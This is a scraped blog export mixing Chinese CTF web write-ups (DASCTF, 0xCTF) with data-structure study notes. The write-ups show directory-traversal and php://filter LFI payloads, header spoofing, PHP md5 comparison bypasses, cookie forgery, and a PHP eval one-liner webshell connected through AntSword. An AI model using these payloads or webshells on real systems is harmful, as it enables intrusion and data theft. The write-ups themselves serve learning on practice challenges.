<p>求助大佬（emmm，应该不算犯规吧）大佬说那一串数字是<strong>unix时间戳</strong>，百度了一波，相当于那一串数字其实表示的是一个时间</p>
<img src="/2020/07/25/DASCTF/image-20200725172909110.png" alt="image-20200725172909110" style="zoom:67%;">

<p>还是那个问题，该怎么传当前时间？？？当前时间一直在变化的呀。</p>
<p>此处贴出大佬的方法：</p>
<img src="/2020/07/25/DASCTF/image-20200725173059630.png" alt="image-20200725173059630" style="zoom:80%;">

<p>python脚本，，，好吧，我是靠<code>.py</code>这个后缀猜的<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f630.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f630.png?v8">😰</span></p>
<p>菜鸡的我再次流下了伤心的类水，咱也不会写python脚本呀（一打开我满是灰尘的pycharm还出错了，大家还是支持正版吧<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8">😂</span>）</p>
<p>不会脚本，只能靠手速了，按照大佬的指导，先转换一个10秒后的时间戳。等到时候再发（妙啊）</p>
<p>一顿操作猛如虎，以为flag呼之欲出了，结果出来的是一堆乱码，淦！</p>
<img src="/2020/07/25/DASCTF/image-20200725173839845.png" alt="image-20200725173839845" style="zoom:50%;">

<p>搞了半天居然没用。。。</p>
<p>后来大佬提示我去看看攻防世界 warmup 这道题的wp,<strong>目录穿越，flag在根目录</strong>，去找了一波wp学习了一下，感觉两个题的确蛮像的，不过那个题源码有提示，这个题看不了源码。我模仿那道题的wp试了试 <code>?file=index.php?/../../../../../../flag</code>不行，又试了试它的各种变形体，失败。我感觉应该没啥问题呀（<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/2b05.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/2b05.png?v8">⬅</span>菜鸡的蜜汁自信）</p>
<p>去问大佬这个姿势错在哪,大佬说不是file=而是f=,我照做了，吧上面那个payload里的file改成了f,还是不行呀。</p>
<p>再次寻求help,大佬让我看看时间对不对，一惊，<strong>还得用时间？</strong> （不是说没卵用的吗，，手动狗头，，）</p>
<p>原来每次都必须t=当前时间戳&amp;f=xxx(这边就解释了为啥是f而不是file了，我还是后来才醒悟)  好吧好吧，先去转换一个20秒后的时间戳，打开手机读秒，我感觉到了胜利的曙光<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f601.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f601.png?v8">😁</span></p>
<p>一回车，妈耶，还是不行呀，奥，那个f=xxx，xxx应该像他原来url里那样用base64编一下码的，害，这脑子。去在线编码网站把<code>index.php?/../../../../../../flag</code> base64编码一下，编码完发现它居然后面没有两个==, 我不会又被在线编码网站给制裁了吧？<img src="/2020/07/25/DASCTF/image-20200725180857115.png" alt="image-20200725180857115">将信将疑地将它复制过去，又开始手动传时间（卑微.jpg），居然成功得到了flag!</p>
<p>一波三折，跌宕起伏，柳暗花明。</p>
<hr>
<p><strong>参赛体验：</strong></p>
<p>1.有机会一定学习一下python脚本，手速传时间实在是卑微</p>
<p>2.多刷题！多刷题！多刷题！多涨涨见识才能触类旁通</p>
<p>第一次参赛，纪念一下吧<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f602.png?v8">😂</span></p>
<p><img src="/2020/07/25/DASCTF/image-20200725181614351.png" alt="image-20200725181614351"></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构疑问</title>
    <url>/2021/03/16/DSQuestion/</url>
    <content><![CDATA[<p>记录《数据结构》中的一些问题</p>
<h4 id="1-时间复杂度O-1-与O-n-的区别？"><a href="#1-时间复杂度O-1-与O-n-的区别？" class="headerlink" title="1.时间复杂度O(1)与O(n)的区别？"></a>1.时间复杂度O(1)与O(n)的区别？</h4><p><img src="/2021/03/16/DSQuestion/image-20210316215804952.png" alt="image-20210316215804952"></p>
<p><img src="/2021/03/16/DSQuestion/image-20210316220103135.png" alt="image-20210316220103135"></p>
<h4 id="2-随机存取"><a href="#2-随机存取" class="headerlink" title="2.随机存取"></a>2.随机存取</h4><p>根据存储位置是否可计算（是否有一个计算地址的公式）来判断该数据结构是否具备随机存取的特性，如数组知道首地址就可计算后面所有元素的地址</p>
<h4 id="第四章-数组和特殊矩阵"><a href="#第四章-数组和特殊矩阵" class="headerlink" title="第四章  数组和特殊矩阵"></a>第四章  数组和特殊矩阵</h4><h5 id="对一个文件的压缩的内在逻辑是否就是对稀疏矩阵的压缩处理？"><a href="#对一个文件的压缩的内在逻辑是否就是对稀疏矩阵的压缩处理？" class="headerlink" title="对一个文件的压缩的内在逻辑是否就是对稀疏矩阵的压缩处理？"></a>对一个文件的压缩的内在逻辑是否就是对稀疏矩阵的压缩处理？</h5><p>文件压缩有很多种，包含了稀疏矩阵</p>
<h5 id="为什么顺序存储的顺序表是依靠数组这个载体实现的，但是数组却不能看做线性结构的推广，对他进行插入和删除"><a href="#为什么顺序存储的顺序表是依靠数组这个载体实现的，但是数组却不能看做线性结构的推广，对他进行插入和删除" class="headerlink" title="为什么顺序存储的顺序表是依靠数组这个载体实现的，但是数组却不能看做线性结构的推广，对他进行插入和删除"></a>为什么顺序存储的顺序表是依靠数组这个载体实现的，但是数组却不能看做线性结构的推广，对他进行插入和删除</h5><p>数组是静态数据结构，本质上没有插入和删除运算</p>
<h5 id="为什么稀疏矩阵压缩存储后，必会失去随机存取功能？"><a href="#为什么稀疏矩阵压缩存储后，必会失去随机存取功能？" class="headerlink" title="为什么稀疏矩阵压缩存储后，必会失去随机存取功能？"></a>为什么稀疏矩阵压缩存储后，必会失去随机存取功能？</h5><p>因为在这种矩阵中，非零元素的分布是没有规律的，为了压缩存储，就将每一个非零元素的值和它所在的行、列号做为一个结点存放在一起，这样的结点组成的线性表中叫三元组表，它已不是简单的向量，所以无法用下标直接存取矩阵中的元素（没有一个计算公式）。</p>
<h5 id="动态数组是先申请一块指定大小的内存块区域，还是先申请一块未定义大小的内存区域之后再定义？"><a href="#动态数组是先申请一块指定大小的内存块区域，还是先申请一块未定义大小的内存区域之后再定义？" class="headerlink" title="动态数组是先申请一块指定大小的内存块区域，还是先申请一块未定义大小的内存区域之后再定义？"></a>动态数组是先申请一块指定大小的内存块区域，还是先申请一块未定义大小的内存区域之后再定义？</h5><p>先申请一块指定大小的内存块区域</p>
<h5 id="动态数组是数组吗？如果是，数组是静态数据结构，那动态数组也是静态数据结构吗？"><a href="#动态数组是数组吗？如果是，数组是静态数据结构，那动态数组也是静态数据结构吗？" class="headerlink" title="动态数组是数组吗？如果是，数组是静态数据结构，那动态数组也是静态数据结构吗？"></a>动态数组是数组吗？如果是，数组是静态数据结构，那动态数组也是静态数据结构吗？</h5><img src="/2021/03/16/DSQuestion/image-20210318140952671.png" alt="image-20210318140952671" style="zoom:80%;">

<p>无论是动态数组还是静态数组，数组长度确定下来后存储空间就确定了，所以静态和动态数组都是静态数据结构</p>
<p>静态数据结构通常不会去定义插入、删除操作</p>
<p><img src="/2021/03/16/DSQuestion/image-20210318141309092.png" alt="image-20210318141309092"></p>
<h5 id="假如数组下标不是从0开始，而是从1开始，会影响到什么？"><a href="#假如数组下标不是从0开始，而是从1开始，会影响到什么？" class="headerlink" title="假如数组下标不是从0开始，而是从1开始，会影响到什么？"></a>假如数组下标不是从0开始，而是从1开始，会影响到什么？</h5><p>lacation计算里会出现一个-1计算</p>
<h5 id="n和t都是未知常数，那O-n-t-复杂度和O-1-有什么区别？稀疏矩阵的快速转置算法中时间复杂度O-n-t-能不能直接写成O-n-？"><a href="#n和t都是未知常数，那O-n-t-复杂度和O-1-有什么区别？稀疏矩阵的快速转置算法中时间复杂度O-n-t-能不能直接写成O-n-？" class="headerlink" title="n和t都是未知常数，那O(n+t)复杂度和O(1)有什么区别？稀疏矩阵的快速转置算法中时间复杂度O(n+t)能不能直接写成O(n)？"></a>n和t都是未知常数，那O(n+t)复杂度和O(1)有什么区别？稀疏矩阵的快速转置算法中时间复杂度O(n+t)能不能直接写成O(n)？</h5><p>n、t都是可变的，是<strong>变量</strong>，所以不能写成O(1)，又不知道n、t哪个大，所以不能写成O(n)或者O(t).在某些情况下，如果知道n,t的大小情况的话是可以写成O(较大的那个)</p>
<h5 id="我们学习的存储稀疏矩阵的方法是利用三元组，有没有更节省存储空间的办法或者更易进行矩阵运算的存储方式？"><a href="#我们学习的存储稀疏矩阵的方法是利用三元组，有没有更节省存储空间的办法或者更易进行矩阵运算的存储方式？" class="headerlink" title="我们学习的存储稀疏矩阵的方法是利用三元组，有没有更节省存储空间的办法或者更易进行矩阵运算的存储方式？"></a>我们学习的存储稀疏矩阵的方法是利用三元组，有没有更节省存储空间的办法或者更易进行矩阵运算的存储方式？</h5><p>更节省空间的暂无</p>
<p>更易进行矩阵运算的有很多（分块啥的）</p>
<h5 id="用数组存储矩阵，我们讨论了转置算法，那么对于其他的矩阵运算，比如求逆，点乘等，是否也有常用的算法？如果是用三元组存储的稀疏矩阵又要怎么进行这些矩阵运算？"><a href="#用数组存储矩阵，我们讨论了转置算法，那么对于其他的矩阵运算，比如求逆，点乘等，是否也有常用的算法？如果是用三元组存储的稀疏矩阵又要怎么进行这些矩阵运算？" class="headerlink" title="用数组存储矩阵，我们讨论了转置算法，那么对于其他的矩阵运算，比如求逆，点乘等，是否也有常用的算法？如果是用三元组存储的稀疏矩阵又要怎么进行这些矩阵运算？"></a>用数组存储矩阵，我们讨论了转置算法，那么对于其他的矩阵运算，比如求逆，点乘等，是否也有常用的算法？如果是用三元组存储的稀疏矩阵又要怎么进行这些矩阵运算？</h5><h5 id="如何实现稀疏矩阵的乘法运算，和平常的矩阵乘法运算相比，时间复杂度能否较为简单？"><a href="#如何实现稀疏矩阵的乘法运算，和平常的矩阵乘法运算相比，时间复杂度能否较为简单？" class="headerlink" title="如何实现稀疏矩阵的乘法运算，和平常的矩阵乘法运算相比，时间复杂度能否较为简单？"></a>如何实现稀疏矩阵的乘法运算，和平常的矩阵乘法运算相比，时间复杂度能否较为简单？</h5><p>可以查查matlab是怎么实现的</p>
<h5 id="C语言中的数组的定义和数据结构中的数组是否相同？C语言中的数组有何局限性？"><a href="#C语言中的数组的定义和数据结构中的数组是否相同？C语言中的数组有何局限性？" class="headerlink" title="C语言中的数组的定义和数据结构中的数组是否相同？C语言中的数组有何局限性？"></a>C语言中的数组的定义和数据结构中的数组是否相同？C语言中的数组有何局限性？</h5><img src="/2021/03/16/DSQuestion/image-20210318140758524.png" alt="image-20210318140758524" style="zoom:80%;">

<h5 id="稀疏矩阵的快速转置算法“快速”的代价是什么？"><a href="#稀疏矩阵的快速转置算法“快速”的代价是什么？" class="headerlink" title="稀疏矩阵的快速转置算法“快速”的代价是什么？"></a>稀疏矩阵的快速转置算法“快速”的代价是什么？</h5><p>存储空间增加了</p>
<h5 id="稀疏矩阵的快速转置算法中，num和k数组的初始化都是必要的吗"><a href="#稀疏矩阵的快速转置算法中，num和k数组的初始化都是必要的吗" class="headerlink" title="稀疏矩阵的快速转置算法中，num和k数组的初始化都是必要的吗"></a>稀疏矩阵的快速转置算法中，num和k数组的初始化都是必要的吗</h5><p>按书上那么做的话是必要的</p>
<p><img src="/2021/03/16/DSQuestion/image-20210318152228362.png" alt="image-20210318152228362"></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>0xCTF web题 writeup</title>
    <url>/2020/07/05/0xctf/</url>
    <content><![CDATA[<p>最近开始接触CTF，主要是web方向，作为一个小白，遭受了各种社会的毒打,好在有大佬指路，勉强能解出些题来，这篇博文主要写写0xCTF中题目的writeup.</p>
<h4 id="1-soeasy"><a href="#1-soeasy" class="headerlink" title="1.soeasy"></a>1.soeasy</h4><p><img src="/2020/07/05/0xctf/image-20200705164040950.jpg" alt="1"></p>
<p>这个题还是蛮简单的，查看源码,稍微找找就能得到flag</p>
<p>稍微总结一下查看源码的方法吧：</p>
<p>a.鼠标右键，点查看源代码</p>
<p>b.<code>F12</code></p>
<p>c.<code>Ctrl+shift+I</code></p>
<p>d.<code>ctrl+U</code></p>
<p>e.在网址前面加上<code>view-source:</code>(火狐反正支持这种方式)</p>
<hr>
<h4 id="2-GET"><a href="#2-GET" class="headerlink" title="2.GET"></a>2.GET</h4><p><img src="/2020/07/05/0xctf/image-20200705165429119.jpg" alt="image-20200705165429119"></p>
<p>稍微判断一下这是一个通过Get方式传参的问题（如果不了解的话提前去了解一下PHP语言，熟悉一下基本语法）</p>
<p>Get方式传参直接在URL后面写上参数并为其赋值即可，本题要传的的参数为0x,值为0xfxxker,故在网址栏应该这么写：</p>
<p><img src="/2020/07/05/0xctf/image-20200705165907235.png" alt="image-20200705165907235"></p>
<p>回车一下就得到了flag.</p>
<hr>
<h4 id="3-POST"><a href="#3-POST" class="headerlink" title="3.POST"></a>3.POST</h4><p><img src="/2020/07/05/0xctf/image-20200705170036059.png" alt="image-20200705170036059"></p>
<p>本题考察的是POST方式传参，我是用火狐插件hackbar来解的（关于hackbar的下载安装并不难，不必装最新版，最新版需要付费，下个旧版就行了，然后关闭自动更新。具体去百度一下）</p>
<p>F12查看源码，然后点Hackbar, <code>laod URL</code>,勾选<code>post date</code>，在下面的框里输入参数并为其赋值，点击<code>Execute</code>就能成功传参，然后flag就有了</p>
<p>当然，用Burpsuit也一样能做，在这不赘述了</p>
<img src="/2020/07/05/0xctf/image-20200705170922230.png" alt="image-20200705170922230" style="zoom: 33%;">



<hr>
<h4 id="4-XFF-amp-Referer"><a href="#4-XFF-amp-Referer" class="headerlink" title="4.XFF&amp;Referer"></a>4.XFF&amp;Referer</h4><p>打开页面只有一句话“只有本地IP才能访问”，刷过攻防世界的新手区的题的话应该会有印象，其实就是伪造一个Ip，然后就可以了</p>
<p>首先利用Burpsuit抓个包，右击发送到repeater,然后在header里面Add一个新的头：<code>X-Forwarded-For</code> , 值为127.0.0.1</p>
<img src="/2020/07/05/0xctf/image-20200705171807465.png" alt="image-20200705171807465" style="zoom:50%;">

<p>点击send（貌似大部分版本是go,小事小事），这时候看右边的响应，多出来一句话“<code>必须来自于：http://0xctf.ctf</code>”</p>
<p>这时同样的方法，在headers中再添加一个名为<code>Refere</code>r的头，值为<code>http://0xctf.ctf</code>,send一下，响应中就出现了flag</p>
<img src="/2020/07/05/0xctf/image-20200705172430570.png" alt="image-20200705172430570" style="zoom: 50%;">

<hr>
<h4 id="5-ezmd5"><a href="#5-ezmd5" class="headerlink" title="5.ezmd5"></a>5.ezmd5</h4><img src="/2020/07/05/0xctf/image-20200705173020907.png" alt="image-20200705173020907" style="zoom: 80%;">

<p>核心是那个if 语句，它要求参数a,b 的值相同但是MD5相同，这里可以利用绕过。（绕过蛮有意思的，当时做这题的时候查了查，觉得有篇博文讲的还蛮好的，在这安利一下：<a href="https://blog.csdn.net/qq_19980431/article/details/83018232">CTF中常见php-MD5()函数漏洞</a>）</p>
<blockquote>
<p>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p><strong>以下值在md5加密后以0E开头：</strong></p>
<ul>
<li>QNKCDZO</li>
<li>240610708</li>
<li>s878926199a</li>
<li>s155964671a</li>
<li>s214587387a</li>
<li>s214587387a</li>
</ul>
<p><strong>以下值在sha1加密后以0E开头：</strong></p>
<ul>
<li>sha1(‘aaroZmOk’)</li>
<li>sha1(‘aaK1STfY’)</li>
<li>sha1(‘aaO8zKZF’)</li>
<li>sha1(‘aa3OFF9m’)</li>
</ul>
</blockquote>
<p>所以可以将a,b赋值成上面所列的由md5加密后以OE开头的两个不同的值，再采用get方式传参即可。</p>
<p><img src="/2020/07/05/0xctf/image-20200705173943800.png" alt="image-20200705173943800"></p>
<hr>
<h4 id="6-ezmd5-2"><a href="#6-ezmd5-2" class="headerlink" title="6.ezmd5-2"></a>6.ezmd5-2</h4><img src="/2020/07/05/0xctf/image-20200705182529614.png" alt="image-20200705182529614" style="zoom:80%;">

<p>与上一题其实蛮类似的，只不过它的限制又变大了，这次是“===”严格相等，不仅值要相等，类型也要相同</p>
<p><strong>PHP中md5的函数特性</strong></p>
<pre><code class="line-numbers language-php">md5([1,2,3]) == md5([4,5,6]) == NULL
</code></pre>
<p>[1] !== [2] &amp;&amp; md5([1]) === md5([2])<br>所以GET传入<code>a[]=1&amp;b[]=2</code>就能够绕过了。</p>
<hr>
<h4 id="7-跳转"><a href="#7-跳转" class="headerlink" title="7.跳转"></a>7.跳转</h4><p>点开页面只有一句话“flag is not here”,抓一下包看一下响应，发现有个比较特别的响应头,<code>location: youcanfindme.php</code>,</p>
<p>虽然有所发现，但是一开始不知道怎么用，尝试在原来的URL后加了个<code>youcanfindme.php</code>,发现页面没变化，一筹莫展。</p>
<p>后来向大佬求助，我应该再抓一次包的，加了<code>youcanfindme.php</code>后的页面抓包后状态码变成了302（暂时性转移），响应里多了个<code>0xctf: MHhDVEZ7MWY5NGIwMzZiY2NkOTA5Nzg2Yzc3MTVkZTg1NGJmMTh9</code>的头，很可疑，很像flag，但是一般flag不是这种形式啊。原来他用了Base64编码，需要先解码（百度上有很多在线解码的）。解码后就出来一个flag。</p>
<p>稍微总结一下：</p>
<p>​    首先，抓包，send to repeater后观察响应头，在原来的URL后面添加发现的<code>youcanfindme.php</code>,再抓一次包，同样观察响应，发现可疑字符串，利用base64编码进行解码即可</p>
<p><img src="/2020/07/05/0xctf/image-20200705184218489.png" alt="image-20200705184218489" style="zoom:50%;"><img src="/2020/07/05/0xctf/image-20200705184247594.png" alt="image-20200705184247594"></p>
<img src="/2020/07/05/0xctf/image-20200705184247594.png" alt="image-20200705184247594" style="zoom:50%;">

<hr>
<h4 id="8-我爱吃饼干"><a href="#8-我爱吃饼干" class="headerlink" title="8.我爱吃饼干"></a>8.我爱吃饼干</h4><p>点进页面，也是只有一句话<code>You are guest now, only admin can see flag</code></p>
<p>抓个包看看吧</p>
<p>抓包后发现响应头里有这样一个头<code>Set-Cookie: Cookie=eyJ1c2VybmFtZSI6Imd1ZXN0In0%3D</code></p>
<p>首先我尝试的是在请求头里添加一个名为<code>cookie</code>的请求头，并把值赋为<code>eyJ1c2VybmFtZSI6Imd1ZXN0In0%3D</code>,失败！</p>
<p>经过上一道题的毒打，我去试了一下这串字符串是不是又是base64编码，结果如下：</p>
<p><img src="/2020/07/05/0xctf/image-20200705185303601.png" alt="image-20200705185303601"></p>
<p>能看出个大概，但是后面出现了乱码，这时候我尝试了一下在请求头里加了一个名为<code>username</code>的请求头，值为<code>guest</code>,失败！又试了一下把值改成<code>admin</code>依旧不行</p>
<p>这时候就得求助了，大佬告诉我%3D这类字符其实是经过特殊编码的，就像%20代表空格一样</p>
<p>比如在网址栏里输入%3D：</p>
<img src="/2020/07/05/0xctf/image-20200705185957749.png" alt="image-20200705185957749" style="zoom:80%;">

<p>这里的%3D其实就相当于=</p>
<p>我实在太菜了，大佬提示到这我还是没能领略，我尝试将原来的%3D替换成=再解码看看，得到<code>{"username":"guest"}</code></p>
<p>虽然解码正常了。但还是不知道怎么利用这个信息，想想题目那句话“only the admin can see the flag”,我试了一下将<code>{"username":"guest"}</code>中的<code>guest</code> 换成<code>admin</code>，获得一串字符，把这串字符作为请求头cookie 的值，send一波，失败!</p>
<p>此时大佬缓缓打出一个:question:方法对了，但是居然解不出来？</p>
<p>我又重新试了一遍，不行，发现我的base64编码出来的字符串和大佬的不一样，我换了一个在线解码的网站，再解了一次，把字符串作为cookie的值，成功解出flag。（什么？我居然被在线解码网站给克制了:angry:）</p>
<hr>
<h4 id="9-eztrick"><a href="#9-eztrick" class="headerlink" title="9.eztrick"></a>9.eztrick</h4><img src="/2020/07/05/0xctf/image-20200706183947270.png" alt="image-20200706183947270">

<p>起初我是把它当绕过来做的，试了试绕过空格的一些方法，都失败了。</p>
<p>后来大佬告诉我不是空格，而是URL编码显示空字符，让我试试<code>？%E%280%AC=xxx</code>的形式，我试了一下<code>？%E%280%AC=%E%280%AC</code>，成功得到flag</p>
<p><img src="/2020/07/05/0xctf/image-20200706184647653.png" alt="image-20200706184647653"></p>
<hr>
<h4 id="10"><a href="#10" class="headerlink" title="10.$$"></a>10.$$</h4><p><img src="/2020/07/05/0xctf/image-20200706184747544.png" alt="image-20200706184747544"></p>
<p>这题考察变量覆盖   此处安利一篇博客：<a href="https://www.jianshu.com/p/a4d782e91852">变量覆盖漏洞</a></p>
<p>准确说是考察由$$引起的变量覆盖，根据题意，在url后面加上<code>？ctf=0xctf</code>,使其满足if 条件语句即可</p>
<hr>
<h4 id="11-extract"><a href="#11-extract" class="headerlink" title="11.extract"></a>11.extract</h4><p><img src="/2020/07/05/0xctf/image-20200706185409318.png" alt="image-20200706185409318"></p>
<p>这题考察由extract（）函数引起的变量覆盖问题，（关于extract（）函数，可自行百度或者阅读上面的博文:arrow_up:）直接在url后面加上<code>？ctf=0xctf</code>,使其满足if 条件语句即可</p>
<hr>
<h4 id="12-parse-str"><a href="#12-parse-str" class="headerlink" title="12.parse_str"></a>12.parse_str</h4><p><img src="/2020/07/05/0xctf/image-20200706185724337.png" alt="image-20200706185724337"></p>
<p>这题考察的是由parse_str()函数引起的变量覆盖，主要是通过变量覆盖使得Leon1===Leon2</p>
<p>之前在学习变量覆盖的时候见过几道这方面的例题，这道题中的<code>$_SERVER["QUERY_STRING"]</code>是我没见到过的，去百度了一下：</p>
<blockquote>
<p>实例：</p>
<p>1，<a href="http://localhost/aaa/">http://localhost/aaa/</a>** (打开aaa中的index.php)<br>结果：<br>$_SERVER[‘QUERY_STRING’] = “”;<br>$_SERVER[‘REQUEST_URI’] = “/aaa/“;<br>$_SERVER[‘SCRIPT_NAME’] = “/aaa/index.php”;<br>$_SERVER[‘PHP_SELF’]   = “/aaa/index.php”;</p>
<p><strong>2，</strong><a href="http://localhost/aaa/?p=222">http://localhost/aaa/?p=222</a> (附带查询)<br>结果：<br>$_SERVER[‘QUERY_STRING’] = “p=222”;<br>$_SERVER[‘REQUEST_URI’] = “/aaa/?p=222”;<br>$_SERVER[‘SCRIPT_NAME’] = “/aaa/index.php”;<br>$_SERVER[‘PHP_SELF’]   = “/aaa/index.php”;</p>
<p><strong>3，<a href="http://localhost/aaa/index.php?p=222&amp;q=333">http://localhost/aaa/index.php?p=222&amp;q=333</a></strong><br>结果：<br>$$_SERVER[‘REQUEST_URI’] = “/aaa/index.php?p=222&amp;q=333”;<br>$_SERVER[‘SCRIPT_NAME’] = “/aaa/index.php”;<br>$_SERVER[‘PHP_SELF’]   = “/aaa/index.php”;</p>
<p>由实例可知：<br>$_SERVER[“QUERY_STRING”] 获取查询 语句，实例中可知，获取的是?后面的值<br>$</p>
<p>_$SERVER[“REQUEST_URI”]  获取 <a href="http://localhost/">http://localhost</a> 后面的值，包括/<br>$_SERVER[“SCRIPT_NAME”]  获取当前脚本的路径，如：index.php<br>$_SERVER[“PHP_SELF”]   当前正在执行脚本的文件名</p>
</blockquote>
<p>其实对于解题来说并没有太大影响</p>
<p>所以直接在url后面添加<code>？Leon1=abc&amp;Leon2=abc</code>即可</p>
<hr>
<h4 id="13-ezupload"><a href="#13-ezupload" class="headerlink" title="13.ezupload"></a>13.ezupload</h4><p><img src="/2020/07/05/0xctf/image-20200708184237017.png" alt="image-20200708184237017"></p>
<p>页面很简单，易得这是一道考察文件上传的题</p>
<p>上传了一张图片，得到一句话</p>
<p><code>you file: ./sandbox/3a64ab0e3d4f435a3ba6e69810dbcd01/wallhaven-0q6qw7.jpg</code></p>
<p>尝试上传一个.php文件，发现没有提示文件格式不对或者一些其他报错，依旧得到一句话：</p>
<p><code>you file: ./sandbox/e5e655202a8c03687b43d65e6351159b/shell3.php</code></p>
<p>尝试了一下分别把这两段话加到url后面，发现图片能够正常显示，而.php回显的是一个空白页面</p>
<p><img src="/2020/07/05/0xctf/image-20200708191734385.png" alt="image-20200708191734385"></p>
<p>后来去找了找这方面的例题，发现一道和这个有点类似的，它说页面回显的是一个空白页面说明一句话木马成功了（对了，上面用的那个.php文件是一句话木马，如<!--?php @eval($_POST['aaa'])?-->，新建一个空白文档，然后输入这句话，另存为.php文件即可生成）</p>
<p>按照网上的解法，接下来把空白页面的url 复制到中国菜刀链接一下即可，我去网上找了找中国菜刀，试了好多次都不行。（当时我十分怀疑我遇到了假的菜刀:cold_sweat:）</p>
<p>继而去求助大佬，这才知道原来像上面用的那句一句话木马在用菜刀时要输入密码，密码为aaa（密码是一句话木马中post或者get的值，上面那个一句话木马的post的值为aaa,故密码为aaa）.大喜:grin:，以为问题解决了，一试发现还是不行，连接不上。大佬说我可能装了个假菜刀:cold_sweat:此处附上大佬提供的中国菜刀与中国蚁剑的官网网址：</p>
<p><em>中国菜刀</em>：<a href="http://www.maicaidao.co/">http://www.maicaidao.co/</a></p>
<p><em>中国蚁剑</em>：<a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
<p>一番波折之后，装上了真·:hocho:,一点添加，依旧没得到想要的结果。大佬建议换成蚁剑试试，成功了！</p>
<p>下面把正确的解题过程重新梳理一下：</p>
<p>首先，准备一个一句话木马（.php文件），然后上传，得到一串类似URL的东西，将它添加到原URL 后面，若回显空页面则说明一句话木马已经成功上传（如果404啥的检查一下URL，多试几次）</p>
<p>准备好中国蚁剑，在空白处右击添加数据，将空页面的URL复制进去，输入密码aaa，点击左上角的添加即可（因为我已经添加过了，所以左上角显示的是保存）</p>
<img src="/2020/07/05/0xctf/image-20200708194242532.png" alt="image-20200708194242532" style="zoom: 67%;">

<p>连接成功后双击打开：</p>
<img src="/2020/07/05/0xctf/image-20200708194638547.png" alt="image-20200708194638547" style="zoom:67%;">

<p>找了找也没找到flag，，，，实在是菜啊:sob:</p>
<p>问了大佬，<strong>flag一般在根目录下</strong>，点开那个<code>/</code>文件夹，在最下面发现了flag文件，点开即可得到flag。</p>
<hr>
<h4 id="14-一键getflag"><a href="#14-一键getflag" class="headerlink" title="14.一键getflag"></a>14.一键getflag</h4><img src="/2020/07/05/0xctf/image-20200709215614854.png" alt="image-20200709215614854" style="zoom:67%;">

<p>点进去，它提示你输入0xCTF网站的IP即可得到flag，菜鸡的我还去百度了一下什么是网站的IP:cold_sweat:</p>
<p>其实就类似127.0.0.1这类的，我查了一下有没有能查询某个指定网站IP的工具，找了一个在线查询的，输入网站的URL后得到网站的IP：<code>39.106.164.8</code></p>
<p>然后一波复制粘贴，发现粘贴不进去，查看源码，发现这样一句话：<input type="text" name="ip" class="form-control" maxlength="4" required=""></p>
<p><strong>maxlength=“4”</strong>说明输入的字符串最大长度为4，而我们的IP地址显然超过了，所以输不进去。想了一下利用Burpsuite抓一波包再改包：</p>
<p>先输入一个4个字符以内的IP。如我输入的是1234，抓包后将IP改为<code>39.106.164.8</code>，再发包即可</p>
<hr>
<h4 id="15-未完成的留言板"><a href="#15-未完成的留言板" class="headerlink" title="15.未完成的留言板"></a>15.未完成的留言板</h4><img src="/2020/07/05/0xctf/image-20200711132555655.png" alt="image-20200711132555655" style="zoom:80%;">

<p>点进去，看一下，是一个留言板</p>
<img src="/2020/07/05/0xctf/image-20200711132711291.png" alt="image-20200711132711291" style="zoom: 33%;">

<p>随便输入一句留言，点击回复</p>
<img src="/2020/07/05/0xctf/image-20200711132823635.png" alt="image-20200711132823635" style="zoom:33%;">

<p>因为题目说flag在fl4g.php，所以我把这个放到URL后面试了一下，跳转出来的还是留言板界面。</p>
<p>查看了一下源码，再抓包看了看，并没有看出什么端倪。于是我查看了提示，提示为：LFI，即本地文件包含，所以本题考查PHP伪协议与本地文件包含漏洞。通过对知识与例题的学习，我尝试了一下用php://filter去读取一下fl4g.php文件，构造如下payload:</p>
<pre><code class="line-numbers language-php">http://ctf.caoyi.site:30002/web8/index.php?file=php://filter/read=convert.base64-encode/resource=fl4g.php
</code></pre>
<p>失败，后来又尝试了一下用php://input的方式写入一句话木马，也失败了（可能是我姿势不对吧:joy:）</p>
<p>继而求助大佬，大佬一针见血地指出了我的问题，上面那个payload里的file参数在本题中并不存在</p>
<p>（的确，由于我是模仿的其他题目的解法，并没完全理解，此处就照搬了file参数</p>
<pre><code class="line-numbers language-php">include($_GET['file']);
</code></pre>
<p>这样的php语句说明file是参数，而本题是action为参数</p>
<pre><code class="line-numbers language-php">include($_GET['action']);
</code></pre>
<p>从点击回复后的url中便可看出<img src="/2020/07/05/0xctf/image-20200711135546090.png" alt="image-20200711135546090" style="zoom:80%;"></p>
